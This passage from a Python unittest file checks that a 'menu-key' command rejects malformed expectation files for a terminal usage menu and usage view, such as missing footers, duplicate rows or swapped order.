            "usage-menu one line": USAGE_EXPECT.split("\n")[0] + "\n",
            "usage-menu swapped (the old order)": USAGE_SELECTED + "\n" + USAGE_DRAFT + "\n",
            "usage-menu draft with an argument": "\u2192 /usage now\n" + USAGE_SELECTED + "\n",
            "usage-menu three lines": USAGE_EXPECT + "     /context  Show context usage breakdown\n",
            "usage-menu unmarked row": USAGE_DRAFT + "\n/usage  Show plan and on-demand usage\n",
        }
        for label, text in bad.items():
            with self.subTest(label=label):
                path = self.root / "bad-expect"
                path.write_text(text)
                code, refused = self.invoke("menu-key", self.args("x", expect=path))
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
        path = self.root / "bad-describe"
        path.write_text("\u2192 /usage    Show plan only\n\u2192 /usage\n")
        code, refused = self.invoke("menu-key", self.args("x", expect=path))
        self.assertEqual((code, refused["state"]), (2, "invalid-input"))
        views = {
            "no title": "Included\nView in dashboard: x\nEsc to close\n",
            "no dashboard row": "Usage\nIncluded\nEsc to close\n",
            "no footer": "Usage\nIncluded\nView in dashboard: x\n",
            "arrow row": "Usage\n\u2192 Add a follow-up\nView in dashboard: x\nEsc to close\n",
            "loading": "Usage\nLoading usage data...\nView in dashboard: x\nEsc to close\n",
            "duplicate": "Usage\nUsage\nView in dashboard: x\nEsc to close\n",
            "footer only": "Esc to close\n",
            "wrong footer": "Usage\nView in dashboard: x\nEsc\n",
            "two dashboard rows": "Usage\nView in dashboard: x\nView in dashboard: y\nEsc to close\n",
            "three url rows": "Usage\nView in dashboard: x\na\nb\nc\nEsc to close\n",
            "dashboard row first": "View in dashboard: x\nUsage\nEsc to close\n",
            "fifteen rows": "Usage\n" + "".join("row %d\n" % i for i in range(12)) + "View in dashboard: x\nEsc to close\n",
        }
        for label, text in views.items():
            with self.subTest(label=label):
                path = self.root / "bad-view"
                path.write_text(text)
                code, refused = self.invoke("menu-key", self.args("x", kind="usage-view", expect=path))
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
        self.assertEqual(self.commands("tmux"), [])


if __name__ == "__main__":
    unittest.main()
